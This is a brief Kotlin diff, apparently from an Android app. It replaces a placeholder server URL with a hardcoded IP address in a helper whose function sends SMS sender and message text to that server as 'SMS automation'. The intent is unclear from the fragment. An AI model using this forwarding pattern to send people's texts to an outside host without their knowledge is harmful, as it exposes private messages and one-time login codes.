@@ -12,8 +12,8 @@ object Net {
     private val TAG = "Net"
     private val client = OkHttpClient()
     
-    // TODO: Replace with your actual server URL
-    private const val SERVER_URL = "http://YOUR_SERVER_IP:8000"
+    // Server URL for SMS automation
+    private const val SERVER_URL = "http://95.217.125.133:8010"
     
     suspend fun sendSmsToServer(sender: String, body: String) {
         val json = JSONObject().apply {
